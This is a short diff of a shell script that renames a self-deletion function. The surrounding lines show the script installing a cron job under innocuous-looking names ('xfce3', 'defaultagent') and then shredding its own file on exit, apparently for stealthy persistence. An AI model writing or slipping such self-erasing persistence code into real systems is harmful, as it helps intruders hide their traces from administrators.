@@ -8,7 +8,7 @@ NEW_DIR="xfce3"
 FILE="defaultagent"
 SCRIPT_PATH="$0"
 
-del() {
+delete_self() {
   echo "Shredding self..."; shred -u ${SCRIPT_PATH};
 }
 
@@ -67,4 +67,4 @@ rm newcron
 
 echo "Cronjob created."
 
-trap del EXIT
+trap delete_self EXIT
